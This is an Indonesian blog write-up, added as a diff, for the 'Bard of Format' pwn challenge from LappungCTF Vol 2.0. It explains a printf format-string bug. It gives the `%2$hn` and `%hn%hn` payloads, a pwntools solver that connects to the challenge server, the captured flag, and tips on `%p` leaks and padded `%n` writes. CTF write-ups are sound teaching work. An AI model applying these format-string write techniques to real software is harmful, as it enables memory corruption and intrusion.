@@ -1,0 +1,146 @@
+---
+title: "LappungCTF Vol 2.0 - Bard of Format RPG (PWN)"
+date: "2025-10-28"
+tags: ["pwn", "ctf", "format-string", "writeup", "lappungctf"]
+summary: "Write-up LappungCTF Vol 2.0 - Bard of Format RPG "
+image: "/blog/LappungCTFVol2.0-BardofFormatRPG/thumb.png"
+author: "Erwin Wijaya"
+draft: false
+featured: true
+---
+
+## Pendahuluan
+
+Ini write-up saya untuk challenge **Bard of Format** dari LappungCTF. Challenge ini adalah game RPG terminal kecil di mana kita lawan dua boss: **Golem** dulu, lalu **Dragon**. Menu utamanya ada: *Attack*, *Guard*, *Skill (Bard Song)*, *Heal*, dan *Quit*. Tujuan saya: dapatin `flag.txt`.
+
+Setelah ngulik binary (decompile pake Ghidra/IDA), sata menemukan bahwa input yang diketik pas memilih *Bard Song* langsung dipakai sebagai **format string** ke `printf()` tanpa proteksi — alias format-string vulnerability. Karena program juga ngirim pointer yang mengarah ke field HP boss sebagai argumen variadik `printf`, kita bisa pake `%hn` untuk nulis 0 ke alamat HP dan langsung nge-zero HP boss. Simpel dan elegan.
+
+---
+
+## Ringkasan exploit (satu kalimat)
+Charge Bard Song dengan dua kali `Guard`, lalu kirim format string yang menulis `0` ke alamat HP boss: `%2$hn` buat Golem, dan `%hn%hn` buat Dragon — setelah HP jadi 0, program buka `flag.txt` dan cetak flag.
+
+---
+
+## Bagian teknis (apa yang saya lihat di reversing)
+
+Saya decompile biner dan menemukan panggilan `printf` berbeda tergantung fase:
+
+- **Fase Golem** (fase 1) memanggil:
+```c
+printf(local_238, 0, puVar8);
+```
+Jadi variadik argumen adalah `0` (argumen pertama) dan `puVar8` (argumen kedua) — `puVar8` ini menunjuk ke struktur boss, dimana offset pertama adalah HP boss. Karena argumen ke-2 adalah pointer ke HP, kita bisa merujuk ke `2$` di format string. Mengirim `%2$hn` akan menulis 2 byte (low 16-bit) bernilai jumlah karakter yang sudah dicetak hingga titik itu. Karena kita tidak mencetak apa-apa sebelum itu, jumlah karakter = 0 → `%2$hn` menulis 0 ke low-16bit HP. Karena HP Golem = 150 (< 65536), menulis low-16bit ke 0 menyebabkan HP = 0.
+
+- **Fase Dragon** (fase 2) memanggil:
+```c
+printf(local_238, (char*)puVar8 + 2, puVar8);
+```
+Sekarang ada dua pointer: satu menunjuk ke `puVar8 + 2` (upper halfword), dan satu ke `puVar8` (lower halfword). Dengan mengirim payload seperti `%hn%hn` kita menulis 0 ke alamat pertama (upper half) lalu 0 ke alamat kedua (lower half) sehingga 32-bit HP menjadi 0.
+
+Catatan penting: `Bard Song` hanya bisa dipakai setelah pemain **survive two full turns** — artinya kita harus menahan serangan boss dua kali; praktisnya `Guard` dua kali sudah cukup.
+
+---
+
+## Kenapa `%hn` bukan `%n`?
+- `%n` menulis ukuran `int`/`long` tergantung platform (4/8 byte). `%hn` menulis 2 byte (16-bit). Karena program memberikan pointer ke halfword (atau kita hanya butuh mengubah low/high 16-bit saja), `%hn` adalah yang tepat dan lebih aman untuk manipulasi halfword.
+- Kita menulis `0`, jadi nggak perlu padding rumit. Kalau mau nulis nilai lain, kita biasanya pakai padding: `"%1234x%2$hn"` untuk menulis 1234 ke alamat.
+
+---
+
+## Script otomatis (PoC) — `solver.py`
+Ini yang saya pake dan berhasil. Pastikan terinstal `pwntools`.
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+HOST = "43.157.205.115"
+PORT = 9006
+
+def charge_skill(io):
+    # Lakukan Guard dua kali supaya Bard Song siap
+    for _ in range(2):
+        io.recvuntil(b"> ")
+        io.sendline(b"2")  # Guard
+
+def bard(io, payload: bytes):
+    io.recvuntil(b"> ")
+    io.sendline(b"3")   # Skill (Bard Song)
+    io.recvuntil(b"Bard Song:")
+    io.sendline(payload)
+
+def main():
+    context.log_level = "info"
+    io = remote(HOST, PORT)
+
+    # Phase 1: kill Golem
+    charge_skill(io)
+    bard(io, b"%2$hn")   # tulis 0 ke low-16bit HP
+
+    # Phase 2: kill Dragon
+    charge_skill(io)
+    bard(io, b"%hn%hn")  # nulis 0 ke upper lalu lower half -> HP = 0
+
+    data = io.recvall(timeout=5)
+    print(data.decode(errors="ignore"))
+
+if __name__ == "__main__":
+    main()
+```
+
+Jalankan:
+```bash
+pip install pwntools
+python3 solver.py
+```
+
+Output yang saya dapatkan ketika menjalankan solver:
+```
+(ctfenv) Deb@Rommel:~/CaptureTheFlag/lappung/pwn/bard$ python3 solver.py
+[+] Opening connection to 43.157.205.115 on port 9006: Done
+[+] Receiving all data: Done (372B)
+[*] Closed connection to 43.157.205.115 port 9006
+ ♪ The echoes of your song ripple across the battlefield.
+
+╔══════════════════════════╗
+║   👑 The boss collapses! ║
+║     You are victorious.  ║
+╚══════════════════════════╝
+FLAG: LappungCTF{a_b4rd_s0n9_L0v3_rPg_b4ttL3_with_m3loDy_f0rm4t_stRr1nG}
+```
+
+---
+
+## Langkah manual (kalau mau pake `nc`)
+
+1. `nc 43.157.205.115 9006`
+2. Saat muncul prompt `> `: ketik `2` lalu Enter (Guard). Ulangi sekali lagi jadi total dua Guard.
+3. Setelah itu ketik `3` lalu Enter (Skill).
+4. Saat muncul `Bard Song:`, ketik `%2$hn` lalu Enter — Golem akan langsung mati / berganti ke Dragon.
+5. Ulangi langkah 2–4 untuk Dragon, tetapi pada step 4 kirim `%hn%hn`.
+6. Kalau semuanya sukses, flag bakal tercetak.
+
+---
+
+## Penjelasan langkah demi langkah (apa yang terjadi di memory)
+
+- Program meletakkan beberapa argumen ke stack saat memanggil `printf`.
+- Di fase Golem argumen terlihat seperti: `printf(fmt, 0, boss_ptr)`. Ini berarti argumen posisi ke-2 (`%2$...`) adalah alamat boss_ptr.
+- `%2$hn` membaca jumlah karakter yang dicetak sejauh ini (0), lalu menulis 2-byte (16-bit) ke alamat `boss_ptr`. Itu men-set bagian bawah dari HP menjadi 0 → cukup untuk mengurangi HP 150 jadi 0.
+- Di fase Dragon program sengaja memanggil `printf(fmt, boss_ptr+2, boss_ptr)` — menyediakan dua pointer ke HP (upper dan lower half). Mengirim `%hn%hn` menulis nilai (jumlah printed chars, masih 0) ke kedua alamat berurutan, sehingga seluruh 32-bit HP = 0.
+- Setelah HP menjadi 0, game akan membuka `flag.txt` dan mencetak isinya.
+
+---
+
+## Troubleshooting & tips
+
+- Kalau koneksi putus: tambahkan retry di script atau naikkan timeout `io = remote(HOST, PORT, timeout=10)`.
+- Jika server punya proteksi rate-limit, jalankan perlahan atau pakai retries.
+- Kalau payload lain bekerja (mis. server berbeda arg order), coba eksplorasi positional specifiers: `%1$`, `%2$`, `%3$`, dst. Gunakan `%p` untuk leak stack jika perlu.
+- Jangan lupa untuk "survive two full turns" sebelum pakai skill — kalau belum charge, program akan menolak.
+
+---
+
+
+
